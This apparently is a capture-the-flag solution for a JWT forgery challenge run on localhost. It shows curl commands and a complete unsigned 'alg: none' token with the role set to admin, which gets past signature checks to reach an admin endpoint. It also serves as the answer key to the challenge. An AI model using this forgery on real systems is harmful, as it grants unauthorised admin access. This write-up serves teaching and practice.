# JWT Forgery - Solution

## Vulnerability

The API endpoint `/api/admin/flag` checks the JWT header's `alg` field. If set to `"none"`, it decodes the payload without verifying the signature, allowing arbitrary token forgery.

## Steps to Solve

1. **Login as guest** to obtain a valid JWT:

   ```bash
   curl -X POST http://localhost:5000/api/login \
     -H "Content-Type: application/json" \
     -d '{"username":"guest","password":"guest"}'
   ```

   Response: `{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJ1c2VyIn0.<signature>"}`

2. **Decode the JWT** and observe the payload contains `{"sub":"guest","role":"user"}`.

3. **Forge a new token** with `alg: none` and `role: admin`:

   - Header: `{"alg":"none","typ":"JWT"}` -> base64url: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`
   - Payload: `{"sub":"guest","role":"admin"}` -> base64url: `eyJzdWIiOiJndWVzdCIsInJvbGUiOiJhZG1pbiJ9`
   - Signature: empty
   - Token: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJhZG1pbiJ9.`

4. **Use the forged token** to access the admin endpoint:

   ```bash
   curl http://localhost:5000/api/admin/flag \
     -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJhZG1pbiJ9."
   ```

   Response: `{"flag":"CTF{REDACTED}","message":"Welcome, admin!"}`

## Flag

```
CTF{REDACTED}
```
